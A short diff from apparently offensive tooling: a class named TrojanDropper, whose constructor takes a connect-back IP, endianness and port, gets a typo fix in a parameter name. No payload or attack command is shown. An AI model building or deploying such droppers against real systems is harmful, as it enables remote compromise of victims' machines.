@@ -188,4 +188,4 @@ class TrojanDropper:
         endianness=details["endianness"]
         port=details["port"]
         
-        return cls(conenctback_ip,endianness,port=port)
+        return cls(connectback_ip,endianness,port=port)
